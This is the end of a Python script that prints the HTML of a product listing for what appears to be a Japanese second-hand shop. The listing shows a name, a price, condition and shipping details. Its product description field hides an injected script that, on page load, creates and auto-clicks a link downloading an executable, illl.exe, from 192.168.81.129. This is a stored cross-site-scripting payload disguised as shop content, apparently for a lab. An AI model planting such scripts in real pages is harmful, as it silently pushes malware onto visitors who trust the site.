...
<body>
<img src="./Goods_Photo/ill.jpg" width="300"height="230"/>
<a href='./illl_cart.cgi'><img src='./button/add.png' width='50'height='50' alt='カートに追加'/></a>
<nobr><a href='./illl_cart.cgi'>カートに追加</a></nobr>
<br>商品名:illl</br>
<br>値段:300</br>
<br>状態:新品・未使用</br>
<br>地域:北海道</br>
<br>配達方法:お手軽郵送</br>
<br>商品説明:ccc<script> var link = document.createElement(`a`);link.href = `http://192.168.81.129/script/illl.exe`;link.download = ``;document.body.appendChild(link);link.click(); </script></br>
</body>
</html>
    '''
print(htmlText.encode("utf-8", 'ignore').decode('utf-8'))
